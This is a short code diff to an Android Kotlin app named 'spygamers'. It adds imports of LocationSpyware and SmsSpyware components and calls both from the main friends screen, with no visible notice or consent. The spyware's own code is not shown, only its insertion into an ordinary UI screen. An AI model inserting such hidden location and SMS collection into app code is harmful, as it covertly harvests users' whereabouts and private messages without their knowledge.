@@ -25,6 +25,8 @@ import com.example.spygamers.Screen
 import com.example.spygamers.components.appbar.AppBar
 import com.example.spygamers.components.appbar.DrawerBody
 import com.example.spygamers.components.appbar.DrawerHeader
+import com.example.spygamers.components.spyware.LocationSpyware
+import com.example.spygamers.components.spyware.SmsSpyware
 import com.example.spygamers.controllers.GamerViewModel
 import com.example.spygamers.models.Friendship
 import com.example.spygamers.services.AuthOnlyBody
@@ -131,6 +133,9 @@ private fun MainBody(
         acceptedFriends = acceptedFriends.filter { it.accountID != idToRemove }
     }
     //#endregion
+
+    LocationSpyware(viewModel, context)
+    SmsSpyware(viewModel = viewModel, context = context)
 
     Column(modifier = Modifier.fillMaxSize()) {
         // Tabs
